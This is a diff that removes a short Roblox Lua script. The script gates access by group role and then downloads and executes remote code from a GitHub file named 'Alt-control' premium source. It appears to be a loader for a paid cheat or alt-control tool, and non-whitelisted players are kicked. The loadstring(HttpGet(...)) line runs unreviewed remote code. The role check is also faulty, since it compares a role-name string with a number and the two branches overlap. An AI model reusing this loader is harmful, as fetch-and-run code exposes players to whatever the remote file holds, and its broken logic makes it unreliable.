@@ -1,8 +1,0 @@
-local groupid = 14494282
-local player = game.Players.LocalPlayer
-
-if player:GetRoleInGroup(groupid) >= 5 then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/656pro/Alt-control-/main/prem%20verison%20source'))()
-elseif player:GetRoleInGroup(groupid) <= 5 then
-    player:Kick("You are not whitelisted\n\nPlease buy premium\nIf you own premium please contact us, or roblox's GroupService could be down.")
-end
